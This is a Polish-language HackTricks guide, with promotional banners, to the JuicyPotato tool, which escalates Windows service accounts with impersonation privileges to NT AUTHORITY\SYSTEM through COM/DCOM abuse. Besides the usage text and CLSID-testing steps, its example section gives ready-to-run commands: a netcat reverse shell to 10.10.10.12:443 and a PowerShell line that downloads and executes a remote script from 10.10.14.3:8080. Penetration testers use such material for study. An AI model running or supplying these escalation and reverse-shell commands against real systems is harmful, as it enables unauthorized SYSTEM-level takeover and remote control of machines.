# JuicyPotato

<details>

<summary><strong>Rozpocznij naukę hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana **dark webem**, która oferuje **darmowe** funkcje sprawdzania, czy firma lub jej klienci zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące dane**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz sprawdzić ich stronę internetową i wypróbować ich silnik **za darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotato nie działa** na Windows Server 2019 i Windows 10 od wersji 1809. Jednak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) można użyć do **wykorzystania tych samych uprawnień i uzyskania dostępu na poziomie `NT AUTHORITY\SYSTEM`**. _**Sprawdź:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (wykorzystanie złotych uprawnień) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Wersja ulepszona_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, z odrobiną soku, czyli **inne narzędzie do eskalacji uprawnień lokalnych, z kont usług systemu Windows do NT AUTHORITY\SYSTEM**_

#### Możesz pobrać juicypotato z [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Podsumowanie <a href="#summary" id="summary"></a>

[Z Readme juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na usłudze [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) mającą słuchacza MiTM na `127.0.0.1:6666` i posiadając uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu budowy systemu Windows znaleźliśmy konfigurację, w której `BITS` został celowo wyłączony, a port `6666` był zajęty.

Zdecydowaliśmy się zbrojnić [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Witaj Juicy Potato**.

> Dla teorii, zobacz [Rotten Potato - Eskalacja uprawnień z kont usługowych do SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i śledź łańcuch linków i odnośników.

Odkryliśmy, że oprócz `BITS` istnieje kilka serwerów COM, które możemy wykorzystać. Muszą one po prostu:

1. być instancjonowalne przez bieżącego użytkownika, zwykle „użytkownika usługi”, który ma uprawnienia do podszycia się
2. implementować interfejs `IMarshal`
3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, ...)

Po przeprowadzeniu testów uzyskaliśmy i przetestowaliśmy obszerną listę [interesujących CLSIDów](http://ohpe.it/juicy-potato/CLSID/) na kilku wersjach systemu Windows.

### Szczegóły Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato pozwala Ci:

* **Wybierz CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _znajdziesz listę zorganizowaną według systemu operacyjnego._
* **Port nasłuchiwania COM** _zdefiniuj preferowany port nasłuchiwania COM (zamiast zahardkodowanego 6666)_
* **Adres IP nasłuchiwania COM** _zwiąż serwer z dowolnym adresem IP_
* **Tryb tworzenia procesu** _w zależności od uprawnień podszycanego użytkownika możesz wybrać spośród:_
* `CreateProcessWithToken` (wymaga `SeImpersonate`)
* `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
* `oba`
* **Proces do uruchomienia** _uruchom wykonywalny plik lub skrypt, jeśli eksploatacja się powiedzie_
* **Argument procesu** _dostosuj argumenty uruchamianego procesu_
* **Adres serwera RPC** _dla dyskretnego podejścia możesz uwierzytelnić się na zewnętrznym serwerze RPC_
* **Port serwera RPC** _przydatny, jeśli chcesz uwierzytelniać się na zewnętrznym serwerze, a zapora blokuje port `135`..._
* **Tryb TEST** _głównie do celów testowych, czyli testowania CLSIDów. Tworzy DCOM i drukuje użytkownika tokena. Zobacz_ [_tutaj testowanie_](http://ohpe.it/juicy-potato/Test/)
### Użycie <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Podsumowanie <a href="#final-thoughts" id="final-thoughts"></a>

[**Z pliku Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.

Prawie niemożliwe jest zapobieżenie nadużyciom wszystkich tych serwerów COM. Możesz pomyśleć o zmianie uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia, to będzie wyzwanie.

Rzeczywiste rozwiązanie polega na ochronie kont i aplikacji, które działają pod kontami `* SERVICE`. Zatrzymanie `DCOM` z pewnością ograniczyłoby to wykorzystanie, ale mogłoby to poważnie wpłynąć na działanie systemu operacyjnego.

Źródło: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Przykłady

Uwaga: Odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/) w celu uzyskania listy CLSID do wypróbowania.

### Uzyskaj odwrócony shell nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell odwrócony
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowe CMD (jeśli masz dostęp RDP)

![](<../../.gitbook/assets/image (297).png>)

## Problemy z CLSID

Często domyślne CLSID, które używa JuicyPotato, **nie działa** i eksploatacja zawodzi. Zazwyczaj wymaga kilku prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do wypróbowania dla określonego systemu operacyjnego, powinieneś odwiedzić tę stronę:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Sprawdzanie CLSID**

Najpierw będziesz potrzebować kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i wykonaj [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do przetestowania.

Następnie pobierz [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i wykonaj go. Zacznie próbować każdego CLSID, a **gdy numer portu się zmieni, oznacza to, że CLSID zadziałał**.

**Sprawdź** działające CLSID **korzystając z parametru -c**

## Odnośniki

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana **dark-webem**, która oferuje **darmowe** funkcje do sprawdzania, czy firma lub jej klienci nie zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące informacje**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz odwiedzić ich stronę internetową i wypróbować ich silnik **za darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
